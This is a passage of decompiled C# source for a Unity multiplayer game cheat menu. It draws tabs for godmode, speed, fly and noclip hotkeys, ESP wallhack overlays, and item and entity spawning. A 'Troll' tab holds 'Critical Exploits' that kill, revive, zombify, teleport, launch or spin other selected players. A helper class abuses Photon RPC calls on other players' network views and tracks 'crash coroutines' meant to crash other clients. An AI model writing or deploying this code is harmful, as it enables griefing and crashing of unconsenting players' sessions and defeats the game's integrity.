				configListScrollPos = GUILayout.BeginScrollView(configListScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(Mathf.Min((float)configList.Count * 30f + 10f, 150f)) });
				foreach (string item in configList)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (item == ConfigManager.CurrentConfigName)
					{
						GUILayout.Label("�", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(20f) });
					}
					else
					{
						GUILayout.Space(20f);
					}
					if (GUILayout.Button(item, GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
					{
						ConfigManager.LoadConfig(item);
						Debug.Log((object)("[Config] Loaded config: " + item));
					}
					if (item != "default" && GUILayout.Button("Delete", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
					{
						GUILayout.Width(60f),
						GUILayout.Height(28f)
					}))
					{
						ConfigManager.DeleteConfig(item);
					}
					GUILayout.EndHorizontal();
				}
				GUILayout.EndScrollView();
				GUILayout.Space(5f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Save Current Config", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					ConfigManager.SaveConfig();
					Debug.Log((object)("[Config] Saved config: " + ConfigManager.CurrentConfigName));
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				GUILayout.Label("Create New Config:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				newConfigName = GUILayout.TextField(newConfigName, GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) });
				if (GUILayout.Button("Create & Save", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
				{
					GUILayout.Width(120f),
					GUILayout.Height(28f)
				}) && !string.IsNullOrEmpty(newConfigName) && !configList.Contains(newConfigName))
				{
					string text = newConfigName;
					ConfigManager.SaveConfig(text);
					Debug.Log((object)("[Config] Created and saved config: " + text));
					newConfigName = "";
				}
				GUILayout.EndHorizontal();
				GUILayout.Label("Config is automatically saved when you change settings.", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("CheaterDetection", "? Cheater Detection", Color.white))
			{
				CheatConfig.CheaterDetectionEnabled = GUIHelpers.DrawToggleButton(CheatConfig.CheaterDetectionEnabled, "Enable Cheater Detection");
				if (CheatConfig.CheaterDetectionEnabled)
				{
					GUILayout.Space(4f);
					GUILayout.Label("Detection Types:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
					CheatConfig.DetectionType_ImpossibleRevive = GUIHelpers.DrawToggleButton(CheatConfig.DetectionType_ImpossibleRevive, "Impossible Revive");
					CheatConfig.DetectionType_ImpossibleTeleport = GUIHelpers.DrawToggleButton(CheatConfig.DetectionType_ImpossibleTeleport, "Impossible Teleport");
					CheatConfig.DetectionType_UnauthorizedItemControl = GUIHelpers.DrawToggleButton(CheatConfig.DetectionType_UnauthorizedItemControl, "Unauthorized Item Control");
					CheatConfig.DetectionType_ImpossibleStatus = GUIHelpers.DrawToggleButton(CheatConfig.DetectionType_ImpossibleStatus, "Impossible Status Manipulation");
					CheatConfig.DetectionType_ImpossibleItemSpawn = GUIHelpers.DrawToggleButton(CheatConfig.DetectionType_ImpossibleItemSpawn, "Impossible Item Spawn");
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (!GUIHelpers.DrawCollapsibleSection("Hotkeys", "? Hotkeys", Color.white))
			{
				return;
			}
			List<string> registeredFeatures = HotkeyManager.GetRegisteredFeatures();
			if (registeredFeatures.Count == 0)
			{
				GUILayout.Label("No features available for hotkey assignment.", GUI.labelStyle, Array.Empty<GUILayoutOption>());
			}
			else
			{
				List<string> list = registeredFeatures.Where((string f) => f.Contains("Godmode") || f.Contains("Speed") || f.Contains("Fly") || f.Contains("Jump") || f.Contains("Clip") || f.Contains("Ammo") || f.Contains("Fire")).ToList();
				List<string> list2 = registeredFeatures.Where((string f) => f.Contains("ESP") || f.Contains("Chams")).ToList();
				List<string> list3 = registeredFeatures.Except(list).Except(list2).ToList();
				if (list.Count > 0)
				{
					GUILayout.Label("Player Modifications:", new GUIStyle(GUI.labelStyle)
					{
						fontSize = 11,
						fontStyle = FontStyle.Bold
					}, Array.Empty<GUILayoutOption>());
					GUILayout.Space(4f);
					foreach (string item2 in list)
					{
						GUI.DrawHotkeyRow(item2);
					}
					GUILayout.Space(8f);
				}
				if (list2.Count > 0)
				{
					GUILayout.Label("ESP Features:", new GUIStyle(GUI.labelStyle)
					{
						fontSize = 11,
						fontStyle = FontStyle.Bold
					}, Array.Empty<GUILayoutOption>());
					GUILayout.Space(4f);
					foreach (string item3 in list2)
					{
						GUI.DrawHotkeyRow(item3);
					}
					GUILayout.Space(8f);
				}
				if (list3.Count > 0)
				{
					GUILayout.Label("Other Features:", new GUIStyle(GUI.labelStyle)
					{
						fontSize = 11,
						fontStyle = FontStyle.Bold
					}, Array.Empty<GUILayoutOption>());
					GUILayout.Space(4f);
					foreach (string item4 in list3)
					{
						GUI.DrawHotkeyRow(item4);
					}
				}
			}
			GUIHelpers.EndCollapsibleSection();
		}
	}
	public static class GUITrollTab
	{
		public static void Draw()
		{
			if (!GUIHelpers.DrawCollapsibleSection("TrollFeatures", "? Troll Features", Color.white))
			{
				return;
			}
			if (GUIHelpers.DrawCollapsibleSection("TrollSettings", "? Troll Settings", Color.white))
			{
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Launch Force:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollLaunchForce = GUILayout.HorizontalSlider(CheatConfig.TrollLaunchForce, 10f, 1000f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollLaunchForce.ToString("F0"), GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Spin Speed:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollSpinSpeed = GUILayout.HorizontalSlider(CheatConfig.TrollSpinSpeed, 100f, 2000f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollSpinSpeed.ToString("F0"), GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Spin Duration:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollSpinDuration = GUILayout.HorizontalSlider(CheatConfig.TrollSpinDuration, 1f, 30f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollSpinDuration.ToString("F1") + "s", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Antigrav Duration:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollAntigravDuration = GUILayout.HorizontalSlider(CheatConfig.TrollAntigravDuration, 1f, 60f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollAntigravDuration.ToString("F1") + "s", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Fall Duration:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.TrollFallDuration = GUILayout.HorizontalSlider(CheatConfig.TrollFallDuration, 1f, 30f, Array.Empty<GUILayoutOption>());
				GUILayout.Label(CheatConfig.TrollFallDuration.ToString("F1") + "s", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUILayout.Space(5f);
				CheatConfig.TrollIncludeSelf = GUILayout.Toggle(CheatConfig.TrollIncludeSelf, "Include Self in Troll Effects", GUI.toggleStyle, Array.Empty<GUILayoutOption>());
				GUIHelpers.EndCollapsibleSection();
			}
			Character val = null;
			if (GUI.playerDict != null && GUI.playerDict.Count > 0 && GUI.selectedPlayerIndex >= 0 && GUI.selectedPlayerIndex < GUI.playerDict.Keys.Count)
			{
				string[] array = GUI.playerDict.Keys.ToArray();
				val = GUI.playerDict[array[GUI.selectedPlayerIndex]];
			}
			if (val != null)
			{
				GUILayout.Label("Target: " + GUI.playerDict.Keys.ToArray()[GUI.selectedPlayerIndex], new GUIStyle(GUI.labelStyle)
				{
					fontSize = 11,
					normal = new GUIStyleState
					{
						textColor = new Color(0.6f, 1f, 0.8f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.Space(5f);
				if (GUIHelpers.DrawCollapsibleSection("CriticalExploits", "? Critical Exploits", Color.white))
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Kill Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.KillPlayer(val, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Revive Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.RevivePlayer(val, applyStatus: false, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Revive & Teleport", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						Vector3 position = ((Character.localCharacter != null) ? (Character.localCharacter.Center + Vector3.up * 2f) : val.Center);
						TrollFeatures.RevivePlayerAtPosition(val, position, applyStatus: false, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Zombify", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.ZombifyPlayer(val, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUIHelpers.EndCollapsibleSection();
				}
				if (GUIHelpers.DrawCollapsibleSection("BasicActionsTroll", "? Basic Actions", Color.white))
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Make Fall", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.MakePlayerFall(val, CheatConfig.TrollFallDuration, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("UnFall", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.UnFallPlayer(val, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Pass Out", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.MakePlayerPassOut(val, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Teleport To Me", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.TeleportPlayerToMe(val, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Walk Off Cliff", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.MakePlayerWalkOffCliff(val, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Stick Body Part", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						Vector3 center = val.Center;
						TrollFeatures.StickPlayerBodyPart(val, (BodypartType)0, center, (STATUSTYPE)0, 0f, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Unstick", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.UnstickPlayer(val, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Make Me Carry", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null)
					{
						TrollFeatures.StartCarryPlayer(Character.localCharacter, val, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Drop Carried", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }) && Character.localCharacter != null && (Object)(object)Character.localCharacter.data.carriedPlayer == (Object)(object)val)
					{
						TrollFeatures.DropCarriedPlayer(Character.localCharacter, val, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Launch Up", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.LaunchPlayerUp(val, CheatConfig.TrollLaunchForce, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Spin Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.MakePlayerSpin(val, CheatConfig.TrollSpinSpeed, CheatConfig.TrollSpinDuration, CheatConfig.TrollIncludeSelf);
					}
					if (GUILayout.Button("Antigrav Player", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
					{
						TrollFeatures.ApplyAntigrav(val, CheatConfig.TrollAntigravDuration, CheatConfig.TrollIncludeSelf);
					}
					GUILayout.EndHorizontal();
					GUIHelpers.EndCollapsibleSection();
				}
			}
			else
			{
				GUILayout.Label("No player selected. Select a player from the Players tab first.", GUI.labelStyle, Array.Empty<GUILayoutOption>());
			}
			GUIHelpers.EndCollapsibleSection();
		}
	}
	public static class GUIVisualsTab
	{
		public static void Draw()
		{
			if (GUIHelpers.DrawCollapsibleSection("PlayerESP", "? Player ESP", Color.white))
			{
				CheatConfig.PlayerBoxESP = GUIHelpers.DrawToggleButton(CheatConfig.PlayerBoxESP, "Box ESP");
				if (CheatConfig.PlayerBoxESP)
				{
					GUILayout.Space(2f);
					CheatConfig.PlayerBox3D = GUIHelpers.DrawToggleButton(CheatConfig.PlayerBox3D, "  3D Box");
				}
				GUILayout.Space(4f);
				CheatConfig.PlayerSkeletonESP = GUIHelpers.DrawToggleButton(CheatConfig.PlayerSkeletonESP, "Skeleton ESP");
				GUILayout.Space(4f);
				CheatConfig.PlayerNameESP = GUIHelpers.DrawToggleButton(CheatConfig.PlayerNameESP, "Name ESP");
				GUILayout.Space(4f);
				CheatConfig.PlayerDistanceESP = GUIHelpers.DrawToggleButton(CheatConfig.PlayerDistanceESP, "Distance ESP");
				GUILayout.Space(4f);
				CheatConfig.PlayerHealthESP = GUIHelpers.DrawToggleButton(CheatConfig.PlayerHealthESP, "Health ESP");
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.PlayerESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.PlayerESPMaxDistance, 10f, 500f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.PlayerESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("EntityESP", "? Entity ESP", Color.white))
			{
				CheatConfig.EntityBoxESP = GUIHelpers.DrawToggleButton(CheatConfig.EntityBoxESP, "Box ESP");
				if (CheatConfig.EntityBoxESP)
				{
					GUILayout.Space(2f);
					CheatConfig.EntityBox3D = GUIHelpers.DrawToggleButton(CheatConfig.EntityBox3D, "  3D Box");
				}
				GUILayout.Space(4f);
				CheatConfig.EntitySkeletonESP = GUIHelpers.DrawToggleButton(CheatConfig.EntitySkeletonESP, "Skeleton ESP");
				GUILayout.Space(4f);
				CheatConfig.EntityNameESP = GUIHelpers.DrawToggleButton(CheatConfig.EntityNameESP, "Name ESP");
				GUILayout.Space(4f);
				CheatConfig.EntityAIStateESP = GUIHelpers.DrawToggleButton(CheatConfig.EntityAIStateESP, "AI State ESP");
				GUILayout.Space(4f);
				CheatConfig.EntityDistanceESP = GUIHelpers.DrawToggleButton(CheatConfig.EntityDistanceESP, "Distance ESP");
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.EntityESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.EntityESPMaxDistance, 10f, 500f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.EntityESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("ItemESP", "? Item ESP", Color.white))
			{
				CheatConfig.ItemBoxESP = GUIHelpers.DrawToggleButton(CheatConfig.ItemBoxESP, "Box ESP");
				if (CheatConfig.ItemBoxESP)
				{
					GUILayout.Space(2f);
					CheatConfig.ItemBox3D = GUIHelpers.DrawToggleButton(CheatConfig.ItemBox3D, "  3D Box");
				}
				GUILayout.Space(4f);
				CheatConfig.ItemNameESP = GUIHelpers.DrawToggleButton(CheatConfig.ItemNameESP, "Name ESP");
				GUILayout.Space(4f);
				CheatConfig.ItemDistanceESP = GUIHelpers.DrawToggleButton(CheatConfig.ItemDistanceESP, "Distance ESP");
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.ItemESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.ItemESPMaxDistance, 10f, 200f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.ItemESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("LuggageESP", "? Luggage ESP", Color.white))
			{
				CheatConfig.LuggageBoxESP = GUIHelpers.DrawToggleButton(CheatConfig.LuggageBoxESP, "Box ESP");
				GUILayout.Space(4f);
				CheatConfig.LuggageNameESP = GUIHelpers.DrawToggleButton(CheatConfig.LuggageNameESP, "Name ESP");
				GUILayout.Space(4f);
				CheatConfig.LuggageDistanceESP = GUIHelpers.DrawToggleButton(CheatConfig.LuggageDistanceESP, "Distance ESP");
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.LuggageESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.LuggageESPMaxDistance, 10f, 200f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.LuggageESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("SporeShroomESP", "? Spore Shroom ESP", Color.white))
			{
				CheatConfig.SporeShroomESP = GUIHelpers.DrawToggleButton(CheatConfig.SporeShroomESP, "Box ESP");
				GUILayout.Label("Shows spore shrooms (explode on touch) with 3D boxes", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					fontStyle = (FontStyle)2,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.SporeShroomESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.SporeShroomESPMaxDistance, 10f, 500f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.SporeShroomESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("EnvironmentalESP", "? Environmental ESP", Color.white))
			{
				CheatConfig.EnvironmentalESP = GUIHelpers.DrawToggleButton(CheatConfig.EnvironmentalESP, "Weather Timers");
				GUILayout.Label("Shows wind and alpine blizzard timers", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					fontStyle = (FontStyle)2,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.EnvironmentalESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.EnvironmentalESPMaxDistance, 10f, 500f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.EnvironmentalESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("ObjectNameESP", "? Object Name ESP", Color.white))
			{
				CheatConfig.ObjectNameESP = GUIHelpers.DrawToggleButton(CheatConfig.ObjectNameESP, "Show Object Names");
				GUILayout.Label("Shows names of all GameObjects (excludes items/entities)", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					fontStyle = (FontStyle)2,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.Space(6f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				GUILayout.Label("Max Distance:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
				CheatConfig.ObjectNameESPMaxDistance = GUILayout.HorizontalSlider(CheatConfig.ObjectNameESPMaxDistance, 10f, 500f, Array.Empty<GUILayoutOption>());
				GUILayout.Label($"{CheatConfig.ObjectNameESPMaxDistance:F0}m", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("ClimbingFeatures", "? Climbing Features", Color.white))
			{
				CheatConfig.ClimbingPredictionEnabled = GUIHelpers.DrawToggleButton(CheatConfig.ClimbingPredictionEnabled, "Climbing Prediction Line");
				GUILayout.Label("Shows how far you can climb until stamina runs out", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					fontStyle = (FontStyle)2,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("FieldOfView", "? Field of View", Color.white))
			{
				GUI.setfieldofview = GUIHelpers.DrawToggleButton(GUI.setfieldofview, "Set Field of View");
				if (GUI.setfieldofview)
				{
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("FOV:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
					GUI.fieldofview = GUILayout.HorizontalSlider(GUI.fieldofview, 60f, 180f, Array.Empty<GUILayoutOption>());
					GUILayout.Label($"{GUI.fieldofview:F0}", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
					GUILayout.EndHorizontal();
				}
				GUIHelpers.EndCollapsibleSection();
			}
		}
	}
	public static class GUIWorldTab
	{
		public static void Draw()
		{
			if (GUIHelpers.DrawCollapsibleSection("SelectItemToSpawn", "? Select Item to Spawn", Color.white))
			{
				GUI.CreateItemsVerticalSelect();
				GUILayout.Space(5f);
				if (GUIHelpers.DrawCollapsibleSection("SelectPlayerForSpawn", "? Select Player", Color.white))
				{
					GUI.CreatePlayersVerticalSelect();
					GUIHelpers.EndCollapsibleSection();
				}
				GUILayout.Space(5f);
				GUI.CreateSpawnItemButtons();
				GUIHelpers.EndCollapsibleSection();
			}
			GUIItemManagement.Draw();
			GUILayout.Space(10f);
			if (GUIHelpers.DrawCollapsibleSection("SpawnEntity", "? Spawn Entity", Color.white))
			{
				GUI.CreateEntityDropdown();
				GUIHelpers.EndCollapsibleSection();
			}
			GUI.DrawEntityManager();
		}
	}
}
namespace _1v1.lol_cheat.Troll
{
	public static class TrollHelpers
	{
		private static Dictionary<Character, Coroutine> activeTrollEffects = new Dictionary<Character, Coroutine>();

		private static List<Coroutine> activeCrashCoroutines = new List<Coroutine>();

		private static MonoBehaviour coroutineRunner;

		public static void Initialize(MonoBehaviour runner)
		{
			coroutineRunner = runner;
		}

		public static PhotonView GetPhotonView(Character target)
		{
			if (target == null)
			{
				return null;
			}
			if (target.refs != null && target.refs.view != null)
			{
				return target.refs.view;
			}
			return target.photonView;
		}

		public static bool CallRPCMethod(Character target, string methodName, RpcTarget rpcTarget, params object[] parameters)
		{
			if (target == null)
			{
				Debug.LogWarning((object)("[Troll] CallRPCMethod: target is null for " + methodName));
				return false;
			}
			if (!PhotonNetwork.IsConnected)
			{
				Debug.LogWarning((object)("[Troll] CallRPCMethod: PhotonNetwork not connected for " + methodName));
				return false;
			}
			PhotonView photonView = GetPhotonView(target);
			if (photonView == null)
			{
				Debug.LogWarning((object)("[Troll] CallRPCMethod: Could not get PhotonView for " + methodName));
				return false;
			}
			if (photonView.ViewID == 0)
			{
				Debug.LogWarning((object)("[Troll] CallRPCMethod: PhotonView has invalid ViewID (0) for " + methodName));
				return false;
			}
			try
			{
				photonView.RPC(methodName, rpcTarget, parameters);
				Debug.Log((object)$"[Troll] Successfully called RPC {methodName} on ViewID {photonView.ViewID}");
				return true;
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[Troll] RPC call failed for " + methodName + ": " + ex.Message + "\n" + ex.StackTrace));
				try
				{
					MethodInfo method = typeof(Character).GetMethod(methodName, BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
					if (method != null)
					{
						object[] customAttributes = method.GetCustomAttributes(typeof(PunRPC), inherit: false);
						if (customAttributes != null && customAttributes.Length != 0)
						{
							method.Invoke(target, parameters);
							Debug.Log((object)("[Troll] Called " + methodName + " directly via reflection (local only - not networked)"));
							return true;
						}
					}
				}
				catch (Exception ex2)
				{
					Debug.LogWarning((object)("[Troll] Direct method call also failed for " + methodName + ": " + ex2.Message));
				}
				return false;
			}
		}

		public static bool ShouldSkipPlayer(Character target, bool includeSelf, bool isCrashEffect = false)
		{
			if (target == null || (Object)(object)target.photonView == (Object)null)
			{
				return true;
			}
			bool isMine = target.photonView.IsMine;
			if (isCrashEffect && isMine)
			{
				return true;
			}
			if (isMine)
			{
				if (GUI.selectedPlayerIndex >= 0 && GUI.playerDict != null && GUI.playerDict.Count > 0)
				{
					string[] array = GUI.playerDict.Keys.ToArray();
					if (GUI.selectedPlayerIndex < array.Length)
					{
						Character val = GUI.playerDict[array[GUI.selectedPlayerIndex]];
						if (val != null && (Object)(object)val == (Object)(object)Character.localCharacter)
						{
							return false;
						}
					}
				}
				if (!includeSelf)
				{
					return true;
				}
			}
			return false;
		}

		public static void RegisterTrollEffect(Character target, Coroutine coroutine)
		{
			if (target != null && coroutine != null)
			{
				activeTrollEffects[target] = coroutine;
			}
		}

		public static void RegisterCrashCoroutine(Coroutine coroutine)
		{
			if (coroutine != null)
			{
